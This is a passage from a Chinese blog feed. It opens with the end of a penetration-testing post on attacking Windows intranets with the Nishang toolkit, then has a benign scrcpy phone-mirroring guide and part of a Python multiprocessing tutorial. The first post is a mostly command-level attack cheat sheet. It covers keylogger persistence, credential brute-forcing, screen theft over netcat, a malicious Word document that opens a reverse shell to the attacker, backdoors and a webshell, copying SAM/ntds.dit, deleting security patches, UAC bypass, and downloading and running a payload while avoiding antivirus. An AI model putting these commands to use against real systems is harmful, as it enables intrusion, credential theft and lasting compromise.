持久化记录（重启之后也记录）</span><br><span class="line"></span><br><span class="line">.\Keylogger.ps1 -persist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 爆破口令  在scan目录下面</span><br><span class="line"></span><br><span class="line">#用于对SQL Server、域控制器、Web和FTP弱口令爆破</span><br><span class="line">Invoke-BruteForce</span><br><span class="line">#命令参数如下</span><br><span class="line">-ComputerName    # 对应服务的计算机名</span><br><span class="line">-UserList  用户名字典</span><br><span class="line">-PasswordList  密码字典</span><br><span class="line">-Service 服务（默认为：SQL）</span><br><span class="line">-StopOnSuccess   匹配一个后停止</span><br><span class="line">-Delay    延迟时间</span><br><span class="line">#比如</span><br><span class="line">Invoke-BruteForce -ComputerName  xx-PC  -UserList user.txt  -PasswordList pass.txt  -Service ActiveDirectory  -Verbose</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 内网扫描器</span><br><span class="line"></span><br><span class="line"># 用于对内网进行扫描，打开本地监听，然后远程传送数据，把把发送给FireListener</span><br><span class="line"></span><br><span class="line">#1.在本机开启监听</span><br><span class="line">FireListener 130-150</span><br><span class="line">#2.在目标机器输入命令：</span><br><span class="line">FireListener 192.168.0.107 130-150 -Verbose</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 内网嗅探</span><br><span class="line"></span><br><span class="line">动静很大，实在没有办法的时候可以试试</span><br><span class="line">目标机执行以下命令</span><br><span class="line">Invoke-Interceptor -ProxyServer 192.168.250.172 -ProxyPort 9999</span><br><span class="line">本机监听</span><br><span class="line">nc -lvvp 9999</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 屏幕窃取   Show-TargetScreen</span><br><span class="line"></span><br><span class="line">#本机可以使用nc获取powercat进行监听（在本地使用支持MJPEG的浏览器比如firefox，访问本机对应监听端口，即可在浏览器上看到从远端传输回来的实时画面，正向反向均可）</span><br><span class="line">Show-TargetScreen -Reverse -IPAddress 192.168.230.1 -Port 443   # 将远程的画面传输给 192.168.230.1 的443端口</span><br><span class="line">参数： Bind --&gt; 正向连接</span><br><span class="line"></span><br><span class="line">在目标机执行以下命令（反向连接）</span><br><span class="line">Show-TargetScreen  -IPAddress 192.168.230.172 -Port 3333</span><br><span class="line">本机输入以下命令 ，接着访问本机的9999端口</span><br><span class="line">nc -nlvp 3333 | nc -nlvp 9999</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">正向连接</span><br><span class="line">目标机执行：</span><br><span class="line">Show-TargetScreen -Bind -Port 3333</span><br><span class="line">本机执行：</span><br><span class="line">nc -nv 192.168.230.37 3333 | nc -lnvp 9999</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Client 的生成(类似木马)</span><br><span class="line"></span><br><span class="line">需要自己绑定payload</span><br><span class="line">首先在本机监听：</span><br><span class="line">nc -lvp 4444</span><br><span class="line">接着制作word文件，打开\nishang\Shell\Invoke-PowerShellTcpOneLine.ps1文件，复制第三行的内容，可以看到有一个`TcpClient`的参数，这就是远程连接的地址，把他改为本机的IP和你监听的端口，改完以后复制代码，在命令行下如下执行</span><br><span class="line">Invoke-Encode -DataToEncode &apos;复制的代码&apos; -IsString -PostScript</span><br><span class="line">执行完之后会在当前目录生成两个文件，一个是encode.txt， 一个是encodedcommand.txt</span><br><span class="line">接着执行命令</span><br><span class="line">Out-Word-PayloadScript .\encodedcommand.txt</span><br><span class="line">会生成一个word文档，用户打开就中招，我们获取到反弹的powershell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##  后门</span><br><span class="line"></span><br><span class="line">1.Http-Backdoor</span><br><span class="line">可以帮助我们在目标机器上下载和执行powershell脚本，接收来自第三方网站的制定，然后在内存中执行powershell脚本</span><br><span class="line"></span><br><span class="line">2.Add-ScrnSaveBackdoor</span><br><span class="line">利用windows的屏保来留下一个隐藏的后门</span><br><span class="line"></span><br><span class="line">3.Execute-OnTime</span><br><span class="line">与Http-Backdoor相比，多了定时功能</span><br><span class="line"></span><br><span class="line">4.Invoke-ADSBackdoor</span><br><span class="line">使用NTFS数据流留下的一个永久后门</span><br><span class="line">最恐怖的后门</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 钓鱼攻击(有道用户输入自己机器的密码)</span><br><span class="line"></span><br><span class="line">Invoke-CredentialsPhish</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## webshell后门   位于 \nishang\Antak-WebShell目录下</span><br><span class="line"></span><br><span class="line">就是一个asp的大马（使用的是powershell的命令，比cmd命令强大）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 复制sam文件（如果运行在DC机上，ntds.dit和SYSTEM hive也能被拷贝出来）</span><br><span class="line"></span><br><span class="line">Copy-VSS    # 直接把文件保存在当前路径下</span><br><span class="line">Copy-VSS -DEstinationDir C:temp    # 制定文件保存路径（必须是已存在的路径）</span><br><span class="line"></span><br><span class="line">## 其他......</span><br></pre></td></tr></table></figure><h6 id="后续控制"><a href="#后续控制" class="headerlink" title="后续控制"></a>后续控制</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># windows上没有nc，需要提前上传一个nc.exe，推荐Linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## No1.反向连接（我用公网来连接目标内网，因为我获取不到内网的公网ip）  在Shells目录下面</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.攻击机器上 NC下执行: </span></span><br><span class="line">nc -lvp <span class="number">3333</span></span><br><span class="line"><span class="comment">#2.在目标服务器 PowerShell下执行：  TCO的</span></span><br><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress <span class="number">192.168</span><span class="number">.0</span><span class="number">.103</span> -Port <span class="number">3333</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## NO2.正向连接:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.目标 PowerShell下执行:  TCP的，  另外还有UDP的: </span></span><br><span class="line">Invoke-PowerShellTcp -Bind -Port <span class="number">3333</span></span><br><span class="line"><span class="comment">#NC下执行: 请求他的3333端口</span></span><br><span class="line">nc -nv <span class="number">192.168</span><span class="number">.0</span><span class="number">.103</span> <span class="number">3333</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 基于UDP( Invoke-PowerShellUdp )，  nc命令有点不同</span></span><br><span class="line"></span><br><span class="line">正向连接</span><br><span class="line">nc -nvu <span class="number">192.168</span><span class="number">.0</span><span class="number">.103</span> <span class="number">3333</span></span><br><span class="line">反向连接</span><br><span class="line">nc lup <span class="number">3333</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 基于http和https  （ Invoke-PoshRatHttp ）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 此外,还有http的shell(执行完会生成一条命令，然后???)</span></span><br><span class="line"></span><br><span class="line">Invoke-PoshRatHttp -Reverse -IPAddress <span class="number">192.168</span><span class="number">.0</span><span class="number">.103</span> -Port <span class="number">3333</span></span><br><span class="line">Invoke-PoshRatHttps -Reverse -IPAddress <span class="number">192.168</span><span class="number">.0</span><span class="number">.103</span> -Port <span class="number">3333</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后将生成的命令复制到`目标机`cmd执行，执行完毕会自动消失，然后在本机的powershell下会返回目标机的会话</span></span><br></pre></td></tr></table></figure><h6 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h6><p>在nishang目录下面的ActiveDirectory下面</p><p><strong>疑难杂症</strong><br>1.真实案例分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.各种安全限制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">无解析</span><br><span class="line"></span><br><span class="line">无权限</span><br><span class="line"></span><br><span class="line">无执行</span><br></pre></td></tr></table></figure><h6 id="系统提权"><a href="#系统提权" class="headerlink" title="系统提权"></a>系统提权</h6><ul><li>基于数据库</li><li>基于漏洞（常用，如果电脑没补丁，可以删除补丁）</li><li>第三方软件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看系统的补丁</span></span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除补丁</span></span><br><span class="line">Remove-Update   <span class="comment"># 然后输入补丁编号</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除全部补丁</span></span><br><span class="line">Remove-Update All</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除全部的安全补丁</span></span><br><span class="line">Remove-Update Security</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定的补丁</span></span><br><span class="line">Remove-Update KB2761226</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### Bypass  UAC    :   模块:Invoke-PsUACme</span></span><br><span class="line">UAC (用户账户控制)</span><br><span class="line">Get-Help  获取帮助</span><br></pre></td></tr></table></figure><h6 id="powershell下载文件-nishang"><a href="#powershell下载文件-nishang" class="headerlink" title="powershell下载文件(nishang)"></a>powershell下载文件(nishang)</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$client = new-object System.Net.WebClient</span><br><span class="line">$client.DownloadFile(<span class="string">'#1'</span>, <span class="string">'#2'</span>)</span><br><span class="line"><span class="comment">#1是需要下载文件的url</span></span><br><span class="line"><span class="comment">#2是保存为本地文件的路径，包括文件名</span></span><br><span class="line">例如：</span><br><span class="line">$client.DownloadFile(<span class="string">'https://www.2cto.com/net/201611/562900.html'</span>, <span class="string">'D:/562900.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者这个方法</span></span><br><span class="line"></span><br><span class="line">$src = <span class="string">'https://www.pstips.net/index.php'</span></span><br><span class="line">$des = <span class="string">"$env:temp\index.php"</span></span><br><span class="line">Invoke-WebRequest -uri $src -OutFile $des</span><br><span class="line">Unblock-File $des</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载完之后就可以用啦</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 下载执行       Download_Execute</span></span><br><span class="line"></span><br><span class="line">下载文本文件，然后转换为可执行文件执行</span><br><span class="line"></span><br><span class="line">利用exetotext.ps1把msf生成的木马端`msf.exe`更改为`msf.txt`文件</span><br><span class="line">ExetoTxt c:msf.exe  c:msf.txt</span><br><span class="line"></span><br><span class="line">然后输入以下命令，调用`Download Execute`脚本下载并执行该文件</span><br><span class="line">Download Execute http://<span class="number">192.168</span><span class="number">.110</span><span class="number">.128</span>/msf.txt</span><br><span class="line"></span><br><span class="line">这时，msf的监听端就会成功获得反弹回来的shell</span><br></pre></td></tr></table></figure><blockquote><p>powershell是没有杀毒软件提示的</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;内网分类：&quot;&gt;&lt;a href=&quot;#内网分类：&quot; class=&quot;headerlink&quot; title=&quot;内网分类：&quot;&gt;&lt;/a&gt;内网分类：&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;带域环境的内网&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;不带域环境的内网&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="内网" scheme="http://www.xpshuai.cn/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="渗透" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>scrcpy-手机与电脑投屏神器</title>
    <link href="http://www.xpshuai.cn/scrcpy-%E6%89%8B%E6%9C%BA%E4%B8%8E%E7%94%B5%E8%84%91%E6%8A%95%E5%B1%8F%E7%A5%9E%E5%99%A8/"/>
    <id>http://www.xpshuai.cn/scrcpy-手机与电脑投屏神器/</id>
    <published>2020-02-24T14:11:37.000Z</published>
    <updated>2020-02-24T14:15:00.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="scrcpy-安装"><a href="#scrcpy-安装" class="headerlink" title="scrcpy 安装"></a>scrcpy 安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snap install scrcpy</span><br></pre></td></tr></table></figure><h4 id="adb服务安装"><a href="#adb服务安装" class="headerlink" title="adb服务安装"></a>adb服务安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install android-tools-adb</span><br></pre></td></tr></table></figure><h4 id="adb配置"><a href="#adb配置" class="headerlink" title="adb配置"></a>adb配置</h4><h6 id="手机通过USB连接电脑"><a href="#手机通过USB连接电脑" class="headerlink" title="手机通过USB连接电脑"></a>手机通过USB连接电脑</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsusb</span><br></pre></td></tr></table></figure><p>找到自己手机的识别号,(可以对比数据线插入之前和插入之后多了哪个就是哪个)</p><h6 id="创建设备文件"><a href="#创建设备文件" class="headerlink" title="创建设备文件"></a>创建设备文件</h6><p>下面所有的<code>04e8</code>改成自己的识别号, <code>android.rules</code>文件名可自定义</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.android</span><br><span class="line"><span class="comment"># 注意你的设备号</span></span><br><span class="line"><span class="built_in">echo</span> 0x04e8 &gt; ~/.android/adb_usb.ini</span><br><span class="line">sudo touch /etc/udev/rules.d/android.rules</span><br><span class="line">sudo gedit /etc/udev/rules.d/android.rules</span><br></pre></td></tr></table></figure><h6 id="在文件中输入"><a href="#在文件中输入" class="headerlink" title="在文件中输入:"></a>在文件中输入:</h6><p>注意自己的设备号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUBSYSTEM==&quot;usb&quot;, SYSFS&#123;idVendor&#125;==&quot;你的设备号&quot;, MODE=&quot;0666&quot;</span><br></pre></td></tr></table></figure><h6 id="保存后修改文件权限"><a href="#保存后修改文件权限" class="headerlink" title="保存后修改文件权限"></a>保存后修改文件权限</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 777 /etc/udev/rules.d/android.rules</span><br></pre></td></tr></table></figure><h6 id="启动adb服务"><a href="#启动adb服务" class="headerlink" title="启动adb服务"></a>启动adb服务</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service udev restart</span><br><span class="line">adb start-server</span><br><span class="line">adb devices</span><br></pre></td></tr></table></figure><p>有设备就说明成功了, 如果没有看看自己手机的开发者模式以及USB调试有没有打开</p><h4 id="使用scrcpy"><a href="#使用scrcpy" class="headerlink" title="使用scrcpy"></a><strong>使用scrcpy</strong></h4><p>命令行输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接使用</span></span><br><span class="line">scrcpy</span><br><span class="line"><span class="comment"># 设置显示尺寸为1080</span></span><br><span class="line">nohun scrcpy -m <span class="number">1080</span> &amp;</span><br></pre></td></tr></table></figure><p>就会弹出界面了</p><h6 id="scrcpy使用方法"><a href="#scrcpy使用方法" class="headerlink" title="scrcpy使用方法"></a>scrcpy使用方法</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">鼠标左键点击、滑动;</span></span><br><span class="line"><span class="string">长按鼠标中键回到主屏幕;Ctrl+Shift+V</span></span><br><span class="line"><span class="string">鼠标右键返回复制文本电脑到手机:  电脑上复制后, 在手机投屏界面按Ctrl+Shift+V复制到手机剪切板, 然后手机中粘贴手机到电脑: 手机上复制到剪切板中, 在投屏界面按下Ctrl+C键，再到电脑正常上粘贴传输文件: 直接在文件管理器复制粘贴</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><h4 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h4><h6 id="全屏-回到合适尺寸"><a href="#全屏-回到合适尺寸" class="headerlink" title="全屏/回到合适尺寸"></a>全屏/回到合适尺寸</h6><p><code>ctrl +f</code>    <code>ctrl + x</code></p><h6 id="展开-折叠通知栏"><a href="#展开-折叠通知栏" class="headerlink" title="展开/折叠通知栏"></a>展开/折叠通知栏</h6><p><code>ctrl +n</code>   <code>ctrl + shift + n</code></p><h4 id="结束投屏"><a href="#结束投屏" class="headerlink" title="结束投屏"></a>结束投屏</h4><p><code>scrcpy -S</code></p><p>或者关掉显示窗口即可</p><hr><h4 id="Scrcpy-的命令参数"><a href="#Scrcpy-的命令参数" class="headerlink" title="Scrcpy 的命令参数"></a>Scrcpy 的命令参数</h4><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>关闭手机屏幕</strong></td><td><code>scrcpy -S</code></td></tr><tr><td><strong>限制画面分辨率</strong></td><td><code>scrcpy -m 1024</code> (比如限制为 1024)</td></tr><tr><td><strong>修改视频码率</strong></td><td><code>scrcpy -b 4M</code> (默认 8Mbps，改成 4Mbps)</td></tr><tr><td><strong>裁剪画面</strong></td><td><code>scrcpy -c 1224:1440:0:0</code> 表示分辨率 1224x1440 并且偏移坐标为 (0,0)</td></tr><tr><td><strong>多设备切换</strong></td><td><code>scrcpy -s 设备ID</code> (使用 <code>adb devices</code> 命令查看设备ID)</td></tr><tr><td><strong>窗口置顶</strong></td><td><code>scrcpy -T</code></td></tr><tr><td><strong>显示触摸点击</strong></td><td><code>scrcpy -t</code> 在演示或录制教程时，可在画面上对应显示出点击动作</td></tr><tr><td><strong>全屏显示</strong></td><td><code>scrcpy -f</code></td></tr><tr><td><strong>文件传输默认路径</strong></td><td><code>scrcpy --push-target /你的/目录</code> 将文件拖放到 scrcpy 可以传输文件，此命令指定默认保存目录</td></tr><tr><td><strong>只读模式(仅显示不控制)</strong></td><td><code>scrcpy -n</code></td></tr><tr><td><strong>屏幕录像</strong></td><td><code>scrcpy -r 视频文件名.mp4</code> 或 <code>.mkv</code></td></tr><tr><td><strong>屏幕录像 (禁用电脑显示)</strong></td><td><code>scrcpy -Nr 文件名.mkv</code></td></tr><tr><td><strong>设置窗口标题</strong></td><td><code>scrcpy --window-title &#39;异次元好棒！&#39;</code></td></tr><tr><td><strong>同步传输声音</strong></td><td>可借助 <a href="https://github.com/rom1v/usbaudio" target="_blank" rel="noopener">USBaudio</a> 这个开源项目实现，但仅支持 <a href="https://www.iplaysoft.com/os/linux-platform" target="_blank" rel="noopener">Linux</a> 系统</td></tr></tbody></table><h4 id="Scrcpy-快捷键列表"><a href="#Scrcpy-快捷键列表" class="headerlink" title="Scrcpy 快捷键列表"></a>Scrcpy 快捷键列表</h4><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>切换全屏模式</td><td><code>Ctrl</code>+<code>F</code></td></tr><tr><td>将窗口调整为1：1（完美像素）</td><td><code>Ctrl</code>+<code>G</code></td></tr><tr><td>调整窗口大小以删除黑色边框</td><td><code>Ctrl</code>+<code>X</code> \</td><td>双击黑色背景</td></tr><tr><td>设备 <code>HOME</code> 键</td><td><code>Ctrl</code>+<code>H</code> \</td><td>鼠标中键</td></tr><tr><td>设备 <code>BACK</code> 键</td><td><code>Ctrl</code>+<code>B</code> \</td><td>鼠标右键</td></tr><tr><td>设备 <code>任务管理</code> 键 (切换APP)</td><td><code>Ctrl</code>+<code>S</code></td></tr><tr><td>设备 <code>菜单</code> 键</td><td><code>Ctrl</code>+<code>M</code></td></tr><tr><td>设备<code>音量+</code>键</td><td><code>Ctrl</code>+<code>↑</code></td></tr><tr><td>设备<code>音量-</code>键</td><td><code>Ctrl</code>+<code>↓</code></td></tr><tr><td>设备<code>电源键</code></td><td><code>Ctrl</code>+<code>P</code></td></tr><tr><td>点亮手机屏幕</td><td>鼠标右键</td></tr><tr><td>复制内容到设备</td><td><code>Ctrl</code>+<code>V</code></td></tr><tr><td>启用/禁用 FPS 计数器（stdout）</td><td><code>Ctrl</code>+<code>i</code></td></tr><tr><td>安装APK</td><td>将 apk 文件拖入投屏</td></tr><tr><td>传输文件到设备</td><td>将文件拖入投屏（非apk）</td></tr></tbody></table><ul><li><strong>投屏并录屏：</strong><code>scrcpy -r file.mp4</code></li><li><strong>不投屏只录屏：</strong><code>scrcpy -Nr file.mp4</code></li></ul><h6 id="录制声音"><a href="#录制声音" class="headerlink" title="录制声音"></a>录制声音</h6><p>结合：<a href="https://github.com/rom1v/usbaudio" target="_blank" rel="noopener">https://github.com/rom1v/usbaudio</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;scrcpy-安装&quot;&gt;&lt;a href=&quot;#scrcpy-安装&quot; class=&quot;headerlink&quot; title=&quot;scrcpy 安装&quot;&gt;&lt;/a&gt;scrcpy 安装&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
      
    
    </summary>
    
      <category term="工具" scheme="http://www.xpshuai.cn/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="工具" scheme="http://www.xpshuai.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="scrcpy" scheme="http://www.xpshuai.cn/tags/scrcpy/"/>
    
  </entry>
  
  <entry>
    <title>python-进程</title>
    <link href="http://www.xpshuai.cn/python-%E8%BF%9B%E7%A8%8B/"/>
    <id>http://www.xpshuai.cn/python-进程/</id>
    <published>2020-02-24T06:40:02.000Z</published>
    <updated>2020-02-24T07:00:26.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>并发：</strong>   任务数大于cpu个数</p><p><strong>并行：</strong>    cpu个数和任务数相同</p><p><strong>GIL 锁:</strong>   任何python进程中，一次永远只有一个线程运行</p><p>一个python进程  只能执行一个线程</p><h6 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 不同操作系统创建进程的区别：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#linux上:   fork() </span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">pid = os.fork() <span class="comment"># 这个地方会创建一个子进程， 他的pid号值永远为0</span></span><br><span class="line"><span class="keyword">if</span> pid == <span class="number">0</span>:</span><br><span class="line">    print(<span class="string">"我是子进程"</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"我是父进程"</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># win上创建进程 类似于导入机制   都通用的</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"000"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p = multiprocessing.Process(target=func)  <span class="comment"># 生成进程, 传参target= ，args=</span></span><br><span class="line">    p.start()       <span class="comment"># 开启进程， 相当于一个子进程</span></span><br></pre></td></tr></table></figure><h6 id="进程标识"><a href="#进程标识" class="headerlink" title="进程标识"></a>进程标识</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进程标识  pid</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"main pid "</span>, os.getpid())   <span class="comment"># 当前进程的</span></span><br><span class="line">print(multiprocessing.current_process().pid)</span><br><span class="line">    p = multiprocessing.Process(target=func)</span><br><span class="line">    print(p.pid)</span><br><span class="line">    p.start()     <span class="comment"># start之后才有pid号</span></span><br><span class="line">    print(p.pid)</span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line"><span class="comment"># 线程的标识是 ident</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 操作系统调用的是进程</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">注意！</span></span><br><span class="line"><span class="string">操作系统并不能看到线程的标识。</span></span><br><span class="line"><span class="string">因为，线程是由Python解释器</span></span><br><span class="line"><span class="string">来负责调度的。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">操作系统仅需要调度进程就行了</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><h6 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 守护进程  daemon = True  